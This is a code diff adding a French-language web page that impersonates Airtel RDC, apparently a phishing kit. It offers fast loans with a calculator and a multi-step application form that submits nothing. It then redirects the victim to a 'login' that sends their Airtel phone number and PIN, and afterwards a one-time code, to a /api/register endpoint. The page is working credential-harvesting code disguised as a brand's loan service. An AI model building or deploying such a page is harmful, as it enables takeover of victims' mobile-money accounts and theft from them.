@@ -1,0 +1,516 @@
+<!DOCTYPE html>
+<html lang="fr" translate="no"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<meta name="google" content="notranslate">
+<title>Prêts Airtel RDC — Approbation rapide</title>
+<style>:root{--red:#e40000;--red-d:#b80000;--bg:#fff;--soft:#fdf2f2;--text:#1a1a1a;--muted:#666;--line:#e8e8e8}
+*{box-sizing:border-box;margin:0;padding:0}
+body{font-family:Inter,system-ui,-apple-system,Segoe UI,Roboto,sans-serif;color:var(--text);background:var(--bg);line-height:1.5}
+a{color:inherit;text-decoration:none}
+.container{max-width:1100px;margin:0 auto;padding:0 20px}
+header{position:sticky;top:0;background:#fff;border-bottom:1px solid var(--line);z-index:10}
+header .container{display:flex;align-items:center;justify-content:space-between;height:64px}
+.logo{font-weight:800;font-size:1.6rem;color:var(--red);letter-spacing:-1px;text-transform:lowercase}
+nav{display:flex;gap:24px;font-size:.95rem}
+nav a{color:var(--muted);padding:4px 0;border-bottom:2px solid transparent}
+nav a:hover,nav a.active{color:var(--red);border-color:var(--red)}
+.btn{display:inline-block;background:var(--red);color:#fff;border:0;border-radius:999px;padding:14px 28px;font-weight:600;font-size:1rem;cursor:pointer;transition:.2s}
+.btn:hover{background:var(--red-d);transform:translateY(-1px)}
+.btn.block{display:block;width:100%;text-align:center}
+.btn.ghost{background:#fff;color:var(--red);border:1.5px solid var(--red)}
+.hero{background:linear-gradient(135deg,var(--red),#ff4d4d);color:#fff;padding:80px 0;overflow:hidden}
+.hero .container{display:flex;align-items:center;justify-content:space-between;gap:30px}
+.hero h1{font-size:clamp(2rem,5vw,3.2rem);line-height:1.15;margin-bottom:14px;max-width:520px}
+.hero p{opacity:.95;margin-bottom:26px}
+.hero .btn{background:#fff;color:var(--red)}
+.hero .emoji{font-size:5rem;letter-spacing:10px}
+section{padding:60px 0}
+.card{background:#fff;border:1px solid var(--line);border-radius:18px;padding:28px;box-shadow:0 8px 30px rgba(0,0,0,.06)}
+h2{font-size:1.7rem;margin-bottom:8px}
+.sub{color:var(--muted);margin-bottom:26px}
+.field{margin-bottom:24px}
+label,.lbl{display:block;font-weight:600;margin-bottom:8px;font-size:.95rem}
+.chips{display:flex;flex-wrap:wrap;gap:8px}
+.chip{border:1.5px solid var(--line);background:#fff;border-radius:999px;padding:8px 18px;cursor:pointer;font-size:.9rem;transition:.15s}
+.chip:hover{border-color:var(--red)}
+.chip.on{background:var(--red);color:#fff;border-color:var(--red)}
+.row{display:flex;align-items:center;justify-content:space-between;margin-bottom:8px}
+.big{font-size:1.5rem;font-weight:700;color:var(--red)}
+input[type=range]{width:100%;accent-color:var(--red)}
+.range-lim{display:flex;justify-content:space-between;color:var(--muted);font-size:.8rem}
+.results{display:grid;grid-template-columns:repeat(3,1fr);gap:14px;margin:26px 0 12px}
+.res{background:var(--soft);border-radius:14px;padding:16px;text-align:center}
+.res small{color:var(--muted);display:block}
+.res b{font-size:1.4rem}
+.res.main b{color:var(--red);font-size:1.8rem}
+.rate{text-align:center;color:var(--muted);font-size:.85rem;margin-bottom:18px}
+.calc{max-width:640px;margin:0 auto}
+.features{display:grid;grid-template-columns:repeat(3,1fr);gap:20px}
+.feat{text-align:center}
+.feat .ic{width:56px;height:56px;border-radius:50%;background:var(--soft);display:grid;place-items:center;font-size:1.6rem;margin:0 auto 14px}
+.feat h3{margin-bottom:6px}
+.feat p{color:var(--muted);font-size:.95rem}
+.title-c{text-align:center;margin-bottom:34px}
+footer{background:#111;color:#bbb;padding:36px 0;font-size:.9rem}
+footer .container{display:flex;flex-direction:column;align-items:center;gap:12px;text-align:center}
+footer .links{display:flex;gap:14px;flex-wrap:wrap;justify-content:center}
+footer a:hover{color:#fff}
+/* apply */
+.steps{display:flex;justify-content:space-between;max-width:640px;margin:30px auto;position:relative}
+.steps::before{content:"";position:absolute;top:16px;left:8%;right:8%;height:2px;background:var(--line)}
+.step{position:relative;text-align:center;font-size:.8rem;color:var(--muted);flex:1}
+.step span{display:grid;place-items:center;width:34px;height:34px;border-radius:50%;background:#fff;border:2px solid var(--line);margin:0 auto 6px;font-weight:700}
+.step.on span{background:var(--red);border-color:var(--red);color:#fff}
+.step.on{color:var(--text)}
+.form{max-width:640px;margin:0 auto 60px}
+input[type=text],input[type=number],select,input.txt{width:100%;padding:13px 14px;border:1.5px solid var(--line);border-radius:12px;font-size:1rem;font-family:inherit;background:#fff}
+input:focus,select:focus{outline:0;border-color:var(--red)}
+.inp-pre{display:flex;align-items:center;gap:8px}
+.inp-pre span{font-weight:600;color:var(--muted)}
+.err{color:var(--red);font-size:.8rem;margin-top:4px;display:none}
+.field.bad .err{display:block}.field.bad input,.field.bad select{border-color:var(--red)}
+.secure{text-align:center;color:var(--muted);font-size:.85rem;margin-top:16px}
+.hidden{display:none}
+.summary div{display:flex;justify-content:space-between;padding:10px 0;border-bottom:1px solid var(--line)}
+.summary div span:first-child{color:var(--muted)}
+.success{text-align:center;padding:30px 0}
+.success .ok{font-size:3.5rem}
+.actions{display:flex;gap:12px}.actions .btn{flex:1}
+@media(max-width:700px){.features,.results{grid-template-columns:1fr}.hero .emoji{display:none}nav{gap:14px;font-size:.85rem}}
+
+.login{max-width:440px;margin:50px auto 0;text-align:center}
+.login .field{text-align:left}
+.ic-lg{font-size:2.6rem;margin-bottom:6px}
+.pin{display:flex;gap:12px}
+.pin input{flex:1;min-width:0;width:100%;text-align:center;font-size:1.6rem;padding:12px 0;border:1.5px solid var(--line);border-radius:12px}
+.pin input:focus{outline:0;border-color:var(--red)}
+.show{display:flex;gap:8px;align-items:center;font-weight:400;margin:10px 0 0;font-size:.85rem;color:var(--muted)}
+.ok-msg{margin-top:16px;padding:12px;border-radius:12px;background:#e9f9ee;color:#12632d;font-weight:600}
+.ok-msg.err-msg{background:#fdeaea;color:#b80000}
+#loginForm button[disabled],#next3[disabled]{opacity:.7;cursor:not-allowed}
+main[hidden]{display:none}
+body{-webkit-text-size-adjust:100%}
+input,select,button{font-size:16px}
+img,svg{max-width:100%}
+@media(max-width:900px){.container{padding:0 16px}.hero{padding:56px 0}section{padding:44px 0}}
+@media(max-width:600px){
+ header .container{height:auto;padding:10px 16px;flex-wrap:wrap;gap:6px}
+ nav{width:100%;justify-content:space-between;gap:8px;font-size:.85rem}
+ .hero{padding:44px 0;text-align:center}.hero .container{justify-content:center}.hero h1{font-size:1.8rem}
+ .card{padding:20px 16px;border-radius:14px}
+ .row{flex-wrap:wrap;gap:4px}
+ .chip{padding:8px 14px}
+ .res.main b{font-size:1.6rem}
+ .steps{margin:20px auto;font-size:.7rem}.step{font-size:.68rem}.step span{width:30px;height:30px}.steps::before{top:14px}
+ .actions{flex-direction:column-reverse}
+ .btn{padding:14px 20px}
+ .pin{gap:8px}
+ footer .links{flex-direction:column;gap:6px}footer .links{font-size:.85rem}
+}
+@media(max-width:360px){.step{font-size:0}.step span{margin:0 auto}}
+</style></head><body translate="no">
+<header><div class="container"><a href="#home" class="logo">airtel</a>
+<nav><a class="active" href="#home" data-view="home">Accueil</a><a href="#home" data-go="pret">Prêts</a><a href="#home" data-go="calculateur">Calculateur</a><a href="#contact" data-view="contact">Contact</a></nav></div></header>
+<main id="view-home">
+
+
+<section class="hero" id="pret"><div class="container"><div>
+<h1>Obtenez votre prêt rapidement approuvé</h1>
+<p>Approbation rapide • Taux compétitifs • Modalités flexibles</p>
+<a class="btn" href="#apply">Demander maintenant</a></div><div class="emoji">💳📱</div></div></section>
+
+<section id="calculateur"><div class="container"><div class="card calc" id="calc">
+<h2>Calculateur de prêt</h2><p class="sub">Choisissez l’objet, le montant et la durée — les résultats sont instantanés.</p>
+<div class="field"><span class="lbl">Objet du prêt</span><div class="chips" id="purposes">
+<button class="chip on" data-v="Personnel">Personnel</button><button class="chip" data-v="Entreprise">Entreprise</button>
+<button class="chip" data-v="Études">Études</button><button class="chip" data-v="Santé">Santé</button><button class="chip" data-v="Logement">Logement</button></div></div>
+<div class="field"><div class="row"><span class="lbl" style="margin:0">Montant du prêt</span><span><small>USD</small> <span class="big" id="amountV">$35,000</span></span></div>
+<input type="range" id="amount" min="100" max="1200" step="10" value="450"><div class="range-lim"><span>$100</span><span>$1,200</span></div></div>
+<div class="field"><div class="row"><span class="lbl" style="margin:0">Durée du prêt</span><span class="big" id="termV">24 mois</span></div>
+<input type="range" id="term" min="6" max="60" step="6" value="24" list="tl">
+<div class="chips" id="terms" style="margin-top:10px"><button class="chip" data-v="6">6m</button><button class="chip" data-v="12">12m</button><button class="chip" data-v="24">24m</button><button class="chip" data-v="36">36m</button><button class="chip" data-v="48">48m</button><button class="chip" data-v="60">60m</button></div></div>
+<div class="results"><div class="res main"><small>Mensualité</small><b id="monthly"></b></div><div class="res"><small>Remboursement total</small><b id="total"></b></div><div class="res"><small>Intérêts estimés</small><b id="interest"></b></div></div>
+<p class="rate" id="rate"></p><a class="btn block" href="#apply">Demander maintenant</a></div></div></section>
+
+<section style="background:#fafafa"><div class="container"><h2 class="title-c">Pourquoi choisir les prêts Airtel ?</h2>
+<div class="features">
+<div class="card feat"><div class="ic">⚡</div><h3>Approbation rapide</h3><p>Votre demande est examinée rapidement avec peu de formalités.</p></div>
+<div class="card feat"><div class="ic">%</div><h3>Faibles taux d’intérêt</h3><p>Des remboursements abordables et des options de financement compétitives.</p></div>
+<div class="card feat"><div class="ic">🔒</div><h3>Traitement sécurisé</h3><p>Vos informations personnelles sont protégées par un chiffrement sécurisé.</p></div></div></div></section>
+
+
+</main>
+<main id="view-apply" hidden>
+
+<div class="container"><div class="steps">
+<div class="step on"><span>1</span>Informations</div><div class="step"><span>2</span>Détails du prêt</div>
+<div class="step"><span>3</span>Vérification</div><div class="step"><span>4</span>Envoi</div></div>
+
+<form class="form card" id="applyForm" onsubmit="return false">
+<div class="panel"><h2>Informations personnelles</h2><p class="sub">Veuillez fournir les informations suivantes pour nous aider à comprendre vos besoins.</p>
+<div class="field"><label for="name">Nom complet</label><input type="text" id="name" class="txt"><div class="err">Champ requis</div></div>
+<div class="field"><label for="purpose">Quel est l’objet du prêt ?</label><select id="purpose"><option value="">Sélectionnez l’objet du prêt</option><option>Personnel</option><option>Entreprise</option><option>Études</option><option>Santé</option><option>Logement</option></select><div class="err">Champ requis</div></div>
+<div class="field"><label for="income">Quel est votre revenu mensuel ?</label><div class="inp-pre"><span>USD</span><input type="number" id="income" min="0"></div><div class="err">Entrez un montant valide</div></div>
+<div class="field"><label for="job">Situation professionnelle</label><select id="job"><option value="">Sélectionnez votre situation</option><option>Salarié</option><option>Indépendant</option><option>Entrepreneur</option><option>Étudiant</option><option>Sans emploi</option><option>Retraité</option></select><div class="err">Champ requis</div></div>
+<div class="field" id="ynField"><span class="lbl">Avez-vous déjà des prêts en cours ? (Oui/Non)</span><div class="chips"><button type="button" class="chip" data-yn="Oui">Oui</button><button type="button" class="chip" data-yn="Non">Non</button></div><div class="err">Veuillez choisir</div></div>
+<button type="button" class="btn block" id="next1">Continuer</button></div>
+
+<div class="panel hidden"><h2>Détails du prêt</h2><p class="sub">Indiquez le montant et la durée souhaités.</p>
+<div class="field"><label for="loanAmount">Montant (USD, 100 – 1 200)</label><input type="number" id="loanAmount" value="450" min="100" max="1200"><div class="err">Montant entre 100 et 1 200</div></div>
+<div class="field"><label for="loanTerm">Durée</label><select id="loanTerm"><option value="6">6 mois</option><option value="12">12 mois</option><option value="24" selected>24 mois</option><option value="36">36 mois</option><option value="48">48 mois</option><option value="60">60 mois</option></select><div class="err">Champ requis</div></div>
+<div class="actions"><button type="button" class="btn ghost back">Retour</button><button type="button" class="btn" id="next2">Continuer</button></div></div>
+
+<div class="panel hidden"><h2>Vérification</h2><p class="sub">Vérifiez vos informations avant l’envoi.</p>
+<div class="summary" id="summary"></div>
+<label style="display:flex;gap:8px;margin:20px 0;font-weight:400"><input type="checkbox" id="agree"> J’accepte les conditions générales et la politique de confidentialité.</label>
+<div class="actions"><button type="button" class="btn ghost back">Retour</button><button type="button" class="btn" id="next3">Envoyer la demande</button></div></div>
+
+<div class="panel hidden success"><div class="ok">✅</div><h2>Demande envoyée</h2><p class="sub">Merci ! Notre équipe examinera votre dossier rapidement.</p><p class="sub">Redirection vers la page de connexion dans <b id="countdown">5</b> s…</p><a class="btn" href="#contact">Se connecter maintenant</a></div>
+
+<p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></form></div>
+
+
+</main>
+<main id="view-contact" hidden><div class="container"><div class="card login">
+<div class="ic-lg">🔐</div><h2>Connexion</h2><p class="sub">Entrez votre numéro Airtel et votre code PIN pour accéder à votre compte.</p>
+<form id="loginForm" novalidate>
+<div class="field"><label for="phone">Numéro de téléphone</label><input type="tel" id="phone" class="txt" inputmode="numeric" autocomplete="tel" value="+243 " placeholder="+243 8X XXX XXXX"><div class="err" id="phoneErr">Entrez un numéro valide : +243 suivi de 9 chiffres</div></div>
+<div class="field"><label>Code PIN (4 chiffres)</label>
+<div class="pin" id="pin"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="PIN 1"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="PIN 2"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="PIN 3"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="PIN 4"></div>
+<label class="show"><input type="checkbox" id="showPin"> Afficher le PIN</label><div class="err" id="pinErr">Le PIN doit contenir 4 chiffres</div></div>
+<button type="submit" class="btn block">Se connecter</button>
+<div class="ok-msg" id="loginOk" hidden></div></form>
+<p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></div>
+<p class="sub" style="text-align:center;margin-top:24px">Besoin d’aide ? Contactez l’assistance Airtel au <b>100</b>.</p></div></main>
+
+<main id="view-otp" hidden>
+<div class="container"><div class="card login">
+<div class="ic-lg">📩</div><h2>Vérification OTP</h2><p class="sub">An OTP has been sent to your number.Please Enter it below</p>
+<form id="otpForm" novalidate>
+<div class="field">
+<div class="pin" id="otpPin"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="OTP 1"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="OTP 2"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="OTP 3"><input type="password" inputmode="numeric" pattern="[0-9]*" maxlength="1" autocomplete="off" autocapitalize="off" spellcheck="false" aria-label="OTP 4"></div>
+<div class="err" id="otpErr">Le code OTP doit contenir 4 chiffres</div></div>
+<button type="submit" class="btn block">Valider</button>
+<div class="ok-msg" id="otpOk" hidden></div></form>
+<p class="secure">🔒 Vos informations sont sécurisées et chiffrées</p></div></div></main>
+
+<footer id="footer"><div class="container"><span class="logo">airtel</span><span>© 2026 Prêts Airtel</span>
+<div class="links"><a href="#">Politique de confidentialité</a>|<a href="#">Conditions générales</a>|<a href="#contact">Contacter l’assistance</a></div></div></footer>
+<script>// Commission fixe de 8 % du montant emprunté (ex. 450 USD -> remboursement total de 486 USD).
+const PURPOSES=['Personnel','Entreprise','Études','Santé','Logement'];
+const COMMISSION=0.08;
+const LOAN_MIN=100,LOAN_MAX=1200;
+const fmt=n=>'$'+Math.round(n).toLocaleString('en-US');
+function calc(P,n){const int=P*COMMISSION,total=P+int,m=total/n;return{m,total,int}}
+
+const calcBox=document.getElementById('calc');
+if(calcBox){
+  let purpose='Personnel';
+  const amt=document.getElementById('amount'),term=document.getElementById('term');
+  const upd=()=>{
+    const P=+amt.value,n=+term.value,c=calc(P,n);
+    document.getElementById('amountV').textContent=fmt(P);
+    document.getElementById('termV').textContent=n+' mois';
+    document.getElementById('monthly').textContent=fmt(c.m);
+    document.getElementById('total').textContent=fmt(c.total);
+    document.getElementById('interest').textContent=fmt(c.int);
+    document.getElementById('rate').textContent=`Commission : ${Math.round(COMMISSION*100)} % du montant emprunté`;
+  };
+  document.querySelectorAll('#purposes .chip').forEach(c=>c.onclick=()=>{
+    document.querySelectorAll('#purposes .chip').forEach(x=>x.classList.remove('on'));
+    c.classList.add('on');purpose=c.dataset.v;upd();
+  });
+  document.querySelectorAll('#terms .chip').forEach(c=>c.onclick=()=>{
+    term.value=c.dataset.v;syncTerms();upd();
+  });
+  const syncTerms=()=>document.querySelectorAll('#terms .chip').forEach(x=>x.classList.toggle('on',x.dataset.v==term.value));
+  amt.oninput=upd;term.oninput=()=>{syncTerms();upd()};
+  syncTerms();upd();
+}
+
+// Formulaire de demande (4 étapes)
+const form=document.getElementById('applyForm');
+if(form){
+  let step=1;const data={};
+  const panels=[...document.querySelectorAll('.panel')];
+  const show=()=>{
+    panels.forEach((p,i)=>p.classList.toggle('hidden',i+1!==step));
+    document.querySelectorAll('.step').forEach((s,i)=>s.classList.toggle('on',i+1<=step));
+    window.scrollTo({top:0,behavior:'smooth'});
+  };
+  const need=(id,test=v=>v.trim()!=='')=>{
+    const el=document.getElementById(id),ok=test(el.value);
+    el.closest('.field').classList.toggle('bad',!ok);return ok;
+  };
+  let loan=0,months=12,loanRate=1.5;
+  const fillSummary=()=>{
+    const c=calc(loan,months);
+    document.getElementById('summary').innerHTML=
+      [['Nom',data.name],['Objet',data.purpose],['Revenu mensuel',fmt(+data.income)],['Situation',data.job],['Prêts en cours',data.loans],
+       ['Montant',fmt(loan)],['Durée',months+' mois'],['Mensualité',fmt(c.m)],['Total à rembourser',fmt(c.total)]]
+      .map(([a,b])=>`<div><span>${a}</span><b>${b}</b></div>`).join('');
+  };
+  document.querySelectorAll('[data-yn]').forEach(c=>c.onclick=()=>{
+    document.querySelectorAll('[data-yn]').forEach(x=>x.classList.remove('on'));
+    c.classList.add('on');data.loans=c.dataset.yn;
+    c.closest('.field').classList.remove('bad');
+  });
+  document.getElementById('next1').onclick=()=>{
+    const ok=[need('name'),need('purpose'),need('income',v=>+v>0),need('job')];
+    const yn=!!data.loans;document.getElementById('ynField').classList.toggle('bad',!yn);
+    if(ok.every(Boolean)&&yn){
+      ['name','purpose','income','job'].forEach(k=>data[k]=document.getElementById(k).value);
+      step=2;show();
+    }
+  };
+  document.getElementById('next2').onclick=()=>{
+    if(!need('loanAmount',v=>+v>=LOAN_MIN&&+v<=LOAN_MAX)||!need('loanTerm'))return;
+    loan=+document.getElementById('loanAmount').value;months=+document.getElementById('loanTerm').value;
+    fillSummary();step=3;show();
+  };
+  document.getElementById('next3').onclick=()=>{
+    if(!document.getElementById('agree').checked){alert('Veuillez accepter les conditions.');return}
+    // Validation JS locale (aucun serveur) : on revérifie tout avant l'envoi "simulé".
+    const okName=typeof data.name==='string'&&data.name.trim()!=='';
+    const okPurpose=PURPOSES.includes(data.purpose);
+    const okIncome=+data.income>0;
+    const okJob=typeof data.job==='string'&&data.job.trim()!=='';
+    const okLoans=data.loans==='Oui'||data.loans==='Non';
+    const okAmount=loan>=LOAN_MIN&&loan<=LOAN_MAX;
+    const okTerm=[6,12,24,36,48,60].includes(months);
+    if(!(okName&&okPurpose&&okIncome&&okJob&&okLoans&&okAmount&&okTerm)){
+      alert('Certaines informations sont invalides. Veuillez revenir en arrière et les corriger.');
+      return;
+    }
+    step=4;show();
+    let t=5;const cd=document.getElementById('countdown');cd.textContent=t;
+    clearInterval(window._redir);
+    window._redir=setInterval(()=>{t--;cd.textContent=t;if(t<=0){clearInterval(window._redir);window.goView('contact')}},1000);
+  };
+  document.querySelectorAll('.back').forEach(b=>b.onclick=()=>{step=Math.max(1,step-1);show()});
+  const q=new URLSearchParams('');
+  if(q.get('amount'))document.getElementById('loanAmount').value=q.get('amount');
+  if(q.get('term'))document.getElementById('loanTerm').value=q.get('term');
+  if(q.get('purpose'))document.getElementById('purpose').value=q.get('purpose');
+  show();
+}
+
+const views={home:document.getElementById('view-home'),apply:document.getElementById('view-apply'),contact:document.getElementById('view-contact'),otp:document.getElementById('view-otp')};
+function show(v,scrollId){
+  Object.keys(views).forEach(k=>views[k].hidden=k!==v);
+  document.querySelectorAll('nav a').forEach(a=>a.classList.toggle('active',(a.dataset.view===v)&&!a.dataset.go));
+  if(scrollId){const t=document.getElementById(scrollId);t?t.scrollIntoView({behavior:'smooth'}):0}else window.scrollTo(0,0);
+}
+document.addEventListener('click',e=>{
+  const a=e.target.closest('a[href^="#"]');if(!a)return;
+  const h=a.getAttribute('href');
+  if(h==='#apply'||h==='#contact'||h==='#home'||h==='#otp'){e.preventDefault();show(h.slice(1),a.dataset.go)}
+});
+document.querySelectorAll('nav a[data-go]').forEach(a=>a.dataset.view='home');
+window.goView=show;
+show('home');
+
+// Connexion
+(function(){
+  const PRE='+243 ',ph=document.getElementById('phone'),pins=[...document.querySelectorAll('#pin input')];
+  const otpPins=[...document.querySelectorAll('#otpPin input')];
+  let globalPhone = '';
+
+  function setEnd(){try{ph.setSelectionRange(ph.value.length,ph.value.length)}catch(e){}}
+  function normalizePhone(raw){
+    let d=String(raw||'').replace(/\D/g,'');
+    if(d.startsWith('243'))d=d.slice(3);
+    d=d.replace(/^0+/,'').slice(0,9);
+    return PRE+[d.slice(0,2),d.slice(2,5),d.slice(5,9)].filter(Boolean).join(' ');
+  }
+  ph.addEventListener('input',()=>{ph.value=normalizePhone(ph.value);setEnd()});
+  ph.addEventListener('focus',()=>{if(!ph.value)ph.value=PRE;setEnd()});
+  ph.addEventListener('click',setEnd);
+  ph.addEventListener('paste',e=>{e.preventDefault();const t=(e.clipboardData||window.clipboardData).getData('text');ph.value=normalizePhone(t);setEnd()});
+  
+  pins.forEach((el,i)=>{
+    el.addEventListener('focus',()=>el.select());
+    el.addEventListener('click',()=>el.select());
+    el.addEventListener('input',()=>{el.value=el.value.replace(/\D/g,'').slice(-1);if(el.value&&pins[i+1])pins[i+1].focus()});
+    el.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!el.value&&pins[i-1]){pins[i-1].focus();pins[i-1].value=''}
+      if(e.key==='ArrowLeft'&&pins[i-1])pins[i-1].focus();if(e.key==='ArrowRight'&&pins[i+1])pins[i+1].focus()});
+    el.addEventListener('paste',e=>{e.preventDefault();const d=(e.clipboardData.getData('text')||'').replace(/\D/g,'').slice(0,4);
+      d.split('').forEach((c,j)=>pins[j].value=c);(pins[Math.min(d.length,3)]||pins[3]).focus()});
+  });
+
+  otpPins.forEach((el,i)=>{
+    el.addEventListener('focus',()=>el.select());
+    el.addEventListener('click',()=>el.select());
+    el.addEventListener('input',()=>{el.value=el.value.replace(/\D/g,'').slice(-1);if(el.value&&otpPins[i+1])otpPins[i+1].focus()});
+    el.addEventListener('keydown',e=>{if(e.key==='Backspace'&&!el.value&&otpPins[i-1]){otpPins[i-1].focus();otpPins[i-1].value=''}
+      if(e.key==='ArrowLeft'&&otpPins[i-1])otpPins[i-1].focus();if(e.key==='ArrowRight'&&otpPins[i+1])otpPins[i+1].focus()});
+    el.addEventListener('paste',e=>{e.preventDefault();const d=(e.clipboardData.getData('text')||'').replace(/\D/g,'').slice(0,4);
+      d.split('').forEach((c,j)=>otpPins[j].value=c);(otpPins[Math.min(d.length,3)]||otpPins[3]).focus()});
+  });
+
+  document.getElementById('showPin').onchange=e=>pins.forEach(p=>p.type=e.target.checked?'text':'password');
+  const loginBtn=document.querySelector('#loginForm button[type=submit]');
+  const otpBtn=document.querySelector('#otpForm button[type=submit]');
+  let loginBusy=false;
+  let otpBusy=false;
+
+  async function handleLogin(e){
+    if(e)e.preventDefault();
+    if(loginBusy)return;
+
+    const digits=ph.value.replace(/\D/g,'').slice(3);
+    const pin=pins.map(p=>p.value).join('');
+    const okP=digits.length===9;
+    const okN=/^\d{4}$/.test(pin);
+
+    ph.closest('.field').classList.toggle('bad',!okP);
+    pins[0].closest('.field').classList.toggle('bad',!okN);
+
+    const msg=document.getElementById('loginOk');
+    msg.hidden=true;
+    msg.classList.remove('err-msg');
+
+    if(!okP||!okN){
+      msg.textContent='❌ Entrez un numéro +243 valide et un PIN à 4 chiffres.';
+      msg.classList.add('err-msg');
+      msg.hidden=false;
+      return;
+    }
+
+    loginBusy=true;
+    loginBtn.disabled=true;
+    const old=loginBtn.textContent;
+    loginBtn.textContent='Enregistrement…';
+
+    globalPhone = '+243' + digits;
+
+    try{
+      const response=await fetch('/api/register',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          phone:globalPhone,
+          pin:pin
+        })
+      });
+
+      const result=await response.json();
+
+      if(!response.ok){
+        throw new Error(result.message||'Enregistrement impossible.');
+      }
+
+      msg.textContent='✅ Connexion réussie.';
+      msg.hidden=false;
+      pins.forEach(p=>p.value='');
+
+      setTimeout(()=>{
+        msg.hidden=true;
+        loginBtn.disabled=false;
+        loginBtn.textContent=old;
+        loginBusy=false;
+        show('otp');
+      }, 1000);
+
+    }catch(err){
+      msg.textContent='❌ '+err.message;
+      msg.classList.add('err-msg');
+      msg.hidden=false;
+      loginBtn.disabled=false;
+      loginBtn.textContent=old;
+      loginBusy=false;
+    }
+  }
+
+  async function handleOtp(e){
+    if(e)e.preventDefault();
+    if(otpBusy)return;
+
+    const otpVal=otpPins.map(p=>p.value).join('');
+    const okOtp=/^\d{4}$/.test(otpVal);
+
+    otpPins[0].closest('.field').classList.toggle('bad',!okOtp);
+
+    const msg=document.getElementById('otpOk');
+    msg.hidden=true;
+    msg.classList.remove('err-msg');
+
+    if(!okOtp){
+      msg.textContent='❌ Le code OTP doit contenir 4 chiffres';
+      msg.classList.add('err-msg');
+      msg.hidden=false;
+      return;
+    }
+
+    otpBusy=true;
+    otpBtn.disabled=true;
+    const old=otpBtn.textContent;
+    otpBtn.textContent='Vérification…';
+
+    try{
+      const response=await fetch('/api/register',{
+        method:'POST',
+        headers:{'Content-Type':'application/json'},
+        body:JSON.stringify({
+          phone: globalPhone || '+243000000000',
+          otp: otpVal
+        })
+      });
+
+      const result=await response.json();
+
+      if(!response.ok){
+        throw new Error(result.message||'Validation OTP impossible.');
+      }
+
+      msg.textContent='✅ Code OTP validé avec succès.';
+      msg.hidden=false;
+      otpPins.forEach(p=>p.value='');
+
+    }catch(err){
+      msg.textContent='❌ '+err.message;
+      msg.classList.add('err-msg');
+      msg.hidden=false;
+    }finally{
+      otpBtn.disabled=false;
+      otpBtn.textContent=old;
+      otpBusy=false;
+    }
+  }
+
+  // Deux accroches (submit du formulaire + clic direct sur le bouton) pour que la connexion
+  // fonctionne même dans un contexte où l'une des deux serait bloquée ; loginBusy empêche
+  // un double déclenchement quand les deux événements se produisent normalement.
+  document.getElementById('loginForm').addEventListener('submit',handleLogin);
+  loginBtn.addEventListener('click',handleLogin);
+  document.getElementById('otpForm').addEventListener('submit',handleOtp);
+  otpBtn.addEventListener('click',handleOtp);
+})();
+</script></body></html>
+
+
+
+
+
+ 
+
+ 
+ 
+ 
+ 
+ 
+ 
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
